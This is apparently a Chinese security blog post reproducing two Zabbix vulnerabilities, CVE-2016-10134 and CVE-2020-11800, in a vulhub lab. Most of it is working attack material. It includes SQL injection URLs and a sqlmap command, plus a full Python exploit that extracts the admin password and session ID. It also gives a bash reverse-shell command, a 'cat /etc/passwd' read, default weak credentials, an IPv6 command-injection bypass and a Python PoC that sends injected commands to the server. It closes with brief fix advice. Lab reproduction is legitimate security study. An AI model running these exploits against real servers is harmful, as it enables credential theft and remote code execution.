#  基于Zabbix的漏洞复现   
原创 ROS  雷神众测   2022-06-21 15:50  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/ofvnGicEPbfRLqgKGNJyxz3CaEjqnJxJxYnB9psTeHmKN3yQP62icf7pzr8UP02wdPbVMXTNwoFzA4xW5K3jEHaTjjpb79fial7/640?wx_fmt=svg "")  
  
  
  
  
**STATEMENT**  
  
**声明**  
  
由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，雷神众测及文章作者不为此承担任何责任。  
  
雷神众测拥有对此文章的修改和解释权。如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经雷神众测允许，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的。  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/ofvnGicEPbfRLqgKGNJyxz3CaEjqnJxJxYnB9psTeHmKN3yQP62icf7pzr8UP02wdPbVMXTNwoFzA4xW5K3jEHaTjjpb79fial7/640?wx_fmt=svg "")  
  
  
  
  
zabbix-latest.php-SQL注入漏洞(CVE-2016-10134)  
  
**漏洞描述**  
  
Zabbix 的latest.php中的toggle_ids[]或jsrpc.php中的profieldx2参数存在sql注入，通过sql注入获取管理员账户密码，或者通过更换sessionid进入后台，利用后台的script功能直接获取zabbix服务器的操作系统权限。  
  
**影响版本**  
  
zabbix 2.2.x，3.0.0-3.0.3  
  
**漏洞复现**  
  
以vulhub作为漏洞环境，IP为192.168.14.128  
  
**latest.php**  
  
（1）靶机系统默认开启游客账户登录，使用游客账户guest，密码为空格登录。（2)查看cookie中的zbx_sessionid，复制后16位字符  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JW6iaS4QIpvF3kDBibJiaYKljFh7lPiaTv7YfmZaXOf2sRC4AQ12F0huPNC65yicKyWRo65ZgGAYzpd9Fg/640?wx_fmt=png "")  
  
（3）将复制的16位字符作为sid的值，访问以下URL即可看到数据库名称。toggle_ids[]为注入点。  
```
  http://192.168.14.128:8080/latest.php?output=ajax&sid=c04ca0eeef290c4c&favobj=toggle&toggle_open_state=1&toggle_ids[]=updatexml(0,concat(0x7e,database(),0x7e),0)
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JW6iaS4QIpvF3kDBibJiaYKljFt4XwUJwrHqk1iclVKsuhmeFzV6PYH5VLcXpjiaOvRCGHBUhFPQHZ3StA/640?wx_fmt=png "")  
  
**jsrpc.php**  
  
（1）访问以下URL也可以触发SQL注入。profileIdx2为注入点。  
```
http://192.168.14.128:8080/jsrpc.php?type=0&mode=1&method=screen.get&profileIdx=web.item.graph&resourcetype=17&profileIdx2=updatexml(0,concat(0x7e,database()),0x7e)
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JW6iaS4QIpvF3kDBibJiaYKljFib1YL2FgH6mAo5GmV5axclbibMMo6yxn1rKtBaurF5fPRYOAcUfSBVwQ/640?wx_fmt=png "")  
  
sqlmap跑一下  
```
python3 sqlmap.py -u "http://192.168.14.128:8080/jsrpc.php?type=0&mode=1&method=screen.get&profileIdx=web.item.graph&resourcetype=17&profileIdx2=updatexml(0,concat(0x7e,database()),0x7e)" -p profileIdx2
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JW6iaS4QIpvF3kDBibJiaYKljFUTHlbwD1jamh0icgPib1ImQMAXJe8ISwtibgh2JmagbCX4qicFac9YEic1w/640?wx_fmt=png "")  
  
（2）利用以下POC获取管理员用户名/密码和session_id。在python2环境下运行该脚本。也可使用工具获取账户。  
```
# -*- coding: utf-8 -*-
# Date: 2016/8/18

import urllib2
import sys, os
import re

def deteck_Sql():
u'检查是否存在 SQL 注入'
payload = "jsrpc.php?sid=0bcd4ade648214dc&type=9&method=screen.get×tamp=1471403798083&mode=2&screenid=&groupid=&hostid=0&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=999'&updateProfile=true&screenitemid=&period=3600&stime=20160817050632&resourcetype=17&itemids%5B23297%5D=23297&action=showlatest&filter=&filter_task=&mark_color=1"
try:
response = urllib2.urlopen(url + payload, timeout=10).read()
except Exception, msg:
print msg
else:
key_reg = re.compile(r"INSERT\s*INTO\s*profiles")
if key_reg.findall(response):
return True

def sql_Inject(sql):
u'获取特定sql语句内容'
payload = url + "jsrpc.php?sid=0bcd4ade648214dc&type=9&method=screen.get×tamp=1471403798083&mode=2&screenid=&groupid=&hostid=0&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=" + urllib2.quote(
sql) + "&updateProfile=true&screenitemid=&period=3600&stime=20160817050632&resourcetype=17&itemids[23297]=23297&action=showlatest&filter=&filter_task=&mark_color=1"
try:
response = urllib2.urlopen(payload, timeout=10).read()
except Exception, msg:
print msg
else:
result_reg = re.compile(r"Duplicate\s*entry\s*'~(.+?)~1")
results = result_reg.findall(response)
if results:
return results[0]

if __name__ == '__main__':
# os.system(['clear', 'cls'][os.name == 'nt'])
print '+' + '-' * 60 + '+'
print u'\t Python Zabbix < 3.0.4 SQL 注入 Exploit'
print '\t Origin Author: http://www.waitalone.cn/'
print '\t\t Modified by: Jamin Zhang'
print '\t\t Date: 2016-08-18'
print '+' + '-' * 60 + '+'
if len(sys.argv) != 2:
print u'用法: ' + os.path.basename(sys.argv[0]) + u' [Zabbix Server Web 后台 URL]'
print u'实例: ' + os.path.basename(sys.argv[0]) + ' http://jaminzhang.github.io'
sys.exit()
url = sys.argv[1]
if url[-1] != '/': url += '/'
passwd_sql = "(select 1 from(select count(*),concat((select (select (select concat(0x7e,(select concat(name,0x3a,passwd) from users limit 0,1),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)"
session_sql = "(select 1 from(select count(*),concat((select (select (select concat(0x7e,(select sessionid from sessions limit 0,1),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)"
if deteck_Sql():
print u'Zabbix 存在 SQL 注入漏洞！\n'
print u'管理员 用户名密码：%s' % sql_Inject(passwd_sql)
print u'管理员 Session_id：%s' % sql_Inject(session_sql)
else:
print u'Zabbix 不存在 SQL 注入漏洞！\n'
```  
```
python2 exploit.py http://192.168.14.128:8080/
```  
  
根据得到的用户名密码登录，或者通过修改zbx_sessionid登录后台。  
  
**getshell**准备：在靶机的配置文件zabbix_agentd.conf中添加EnableRemoteCommands = 1  
```
docker ps # 查看agent的容器id
docker exec -it 9344458704f9 /bin/sh # 进入容器
vi /etc/zabbix/zabbix_agentd.conf # 添加EnableRemoteCommands = 1
docker restart 9344458704f9 # 重启容器
```  
  
（1）以管理员身份登录后台后，依次点击Administrator-->scrip-->creatscript  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JW6iaS4QIpvF3kDBibJiaYKljFkz0ckXJszLjth76IKbK18iaibPjrwSuggmIp8ZLApcgAlnDDnxViavuPQ/640?wx_fmt=png "")  
  
（2）在commands中写入反弹shell命令，点击Add  
```
bash -i >& /dev/tcp/ip/port 0>&1 # ip和port为攻击者的ip和开启的端口
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JW6iaS4QIpvF3kDBibJiaYKljFuu1qTQFxnic6yLaBKwgSdcr0qWbpgoiaSwFtgKias3F7H9tzricicBu2icDQ/640?wx_fmt=png "")  
  
（3）保存创建的script后依次点击Monitroing-Latest data，选择Host groups的select，全选。再点击Filter-->Zabbix server，选择刚刚创建的shell即可。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JW6iaS4QIpvF3kDBibJiaYKljFHNTVfECEOdmKI70E7lFYoJ52ziajWEPTCBj73yNvNRLFraey5Q5eO0g/640?wx_fmt=png "")  
  
在攻击机上开启监听。但我这里没弹回来。  
```
nc -lvp port
```  
  
（4）虽然没有弹回shell，但依然存在命令执行。修改原来保存的shell或者再创建一个test，执行后可看到效果。  
```
cat /etc/passwd
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JW6iaS4QIpvF3kDBibJiaYKljFPV7a8qOjDPKia4rLG4yxpySanrIuianYpJocf6syiaZ2jOkLzF9SHFQyQ/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JW6iaS4QIpvF3kDBibJiaYKljFc6jUSzymFQIiaczzt4UUDxVon6Nv04FZUpvqK3ZoYkCc8XT1QRprBbw/640?wx_fmt=png "")  
  
**修复建议**1.更新到最新版本2.禁用guest登陆功能3.禁用远程命令  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/ofvnGicEPbfRLqgKGNJyxz3CaEjqnJxJxYnB9psTeHmKN3yQP62icf7pzr8UP02wdPbVMXTNwoFzA4xW5K3jEHaTjjpb79fial7/640?wx_fmt=svg "")  
  
  
  
  
Zabbix命令执行漏洞(CVE-2020-11800)  
  
**漏洞描述**Zabbix Server的trapper命令处理，存在命令注入漏洞，可导致远程代码执行。需要服务端配置开启自动注册，或者Zabbix Proxy（会认证主机名）自动发现。**影响版本**Zabbix 3.0.x~3.0.30**漏洞分析**该漏洞原理与CVE-2017-2824相同，参考  
```
https://talosintelligence.com/reports/TALOS-2017-0325
```  
  
active checks是自动注册的命令字，自动注册的本意是agent可主动将主机注册给server进行监控，在2.2.18版本中可以在IP中注入（参见上文的版本分析处，2.2.19版本才增加了ip校验）shell命令。CVE-2017-2824提到的漏洞在discovery data命令字即自动发现功能中，由于没有校验IP，导致可在IP中写入shell命令，进而在执行script cmd时达到命令注入。比如在IP中写入内容  
```
;touch /tmp/zabbix_pwned
```  
  
那么执行ping命令时就变为  
```
/bin/ping -c 3 ;touch /tmp/zabbix_pwned 2>&1
```  
  
CVE-2017-2824在3.0.x的修复办法是，对IP进行校验，但是校验IP的方法可以被绕过，Ipv4校验没问题，ipv6校验可绕过。输入为ffff:::;touch /tmp/1234pwn即可绕过，进而实现命令注入。**漏洞复现**（1）以vulhub作为漏洞环境，IP为192.168.14.128  
```
docker-compose up -d
docker-compose ps //查看容器是否全部成功启动，若没有则重新执行docker-compose up -d，否则会导致复现失败。
如下图所示则为容器全部启动成功。
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JW6iaS4QIpvF3kDBibJiaYKljFIiciaOuicV7SOjFYicvJWKtyBTRhUYOiabvuGiac8vJanCOCLN13qy4HJKMw/640?wx_fmt=png "")  
  
（2）访问IP:8080。  
```
弱口令
("admin","zabbix"),("Admin","zabbix"),("guest"," ")
以管理员身份登录
```  
  
（3）进入Configuration->Actions，将Event source调整为Auto registration，然后点击Create action，创建一个Action，名字随意。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JW6iaS4QIpvF3kDBibJiaYKljFDJmZxucnIfxarPZh3jTicF37feCVvnTsxonYtylwriaguxPn2FbKbYAg/640?wx_fmt=png "")  
  
第二个标签页设置条件，可配置host name、proxy和host metadata包含或不包含某个关键字。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JW6iaS4QIpvF3kDBibJiaYKljFMwSs46CNUGdR3mb5pm43lsXfeeK66WPB4Qllc6LZY1wd8p9qtfXBDg/640?wx_fmt=png "")  
  
第三个标签页，指定操作，可以为发送消息、添加主机等，这里要选择Add host。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JW6iaS4QIpvF3kDBibJiaYKljFglXFCpWocTfibrorHic21YxuwZIJZL7uccflruDVYXPTDGAbWibYQGnmg/640?wx_fmt=png "")  
  
以上规则的意思就是任意自动注册的host，没有任何拒绝规则，都会直接添加到server中。  
  
（4）执行以下POC脚本，该poc执行的是写入文件的操作，使用python3执行该poc。  
```
import sys
import socket
import json
import sys

def send(ip, data):
conn = socket.create_connection((ip, 10051), 10)
conn.send(json.dumps(data).encode())
data = conn.recv(2048)
conn.close()
return data

target = sys.argv[1]
print(send(target, {"request":"active checks","host":"vulhub","ip":"ffff:::;touch /tmp/success2"}))
for i in range(10000, 10500):
data = send(target, {"request":"command","scriptid":1,"hostid":str(i)})
if data and b'failed' not in data:
print('hostid: %d' % i)
print(data)
```  
  
当出现如下结果后说明命令执行成功。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JW6iaS4QIpvF3kDBibJiaYKljFGbY3Sica0bS5my11Y1neevgHhzYstQR5iaF86bWtEwsWTSkbGrv1dAJQ/640?wx_fmt=png "")  
  
（5）进入server容器，可看见/tmp/success2已成功创建。  
```
docker ps //列出容器
docker exec -it c8552d7e36ce /bin/bash //进入server容器
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JW6iaS4QIpvF3kDBibJiaYKljFtn6cf0BPibwu8gSK73ZLRbcwV8eOico5ysdnzhUpphCNE1pOicdf9hjng/640?wx_fmt=png "")  
  
**修复建议**建议升级至最新版本  
  
  
**安恒信息**  
  
  
✦  
  
杭州亚运会网络安全服务官方合作伙伴  
  
成都大运会网络信息安全类官方赞助商  
  
武汉军运会、北京一带一路峰会  
  
青岛上合峰会、上海进博会  
  
厦门金砖峰会、G20杭州峰会  
  
支撑单位北京奥运会等近百场国家级  
  
重大活动网络安保支撑单位  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/HxO8NorP4JW6iaS4QIpvF3kDBibJiaYKljF50iaz91GFgWUgWIAMF3LFnTnklCibtPe5hsdcT5wta15MjKL068vAbpA/640?wx_fmt=jpeg "")  
  
  
  
END  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/HxO8NorP4JW6iaS4QIpvF3kDBibJiaYKljF8XeJLshu8zm8QoT95CKcbd4TQ9cZ4Z9q1ezb6ndl5k9ISd0ITO41tQ/640?wx_fmt=gif "")  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/HxO8NorP4JW6iaS4QIpvF3kDBibJiaYKljFMnRWibUAkKTUccrAUehYiaUj8KicmYssSks7NTQiaR3zpgaze63QoIFF8Q/640?wx_fmt=jpeg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/HxO8NorP4JW6iaS4QIpvF3kDBibJiaYKljF8xPCnc2ojSibeRw6AVTxkkbKy5g2s8YUnYzdnKk8ib1WOpGsCtfVeptw/640?wx_fmt=gif "")  
  
**长按识别二维码关注我们**  
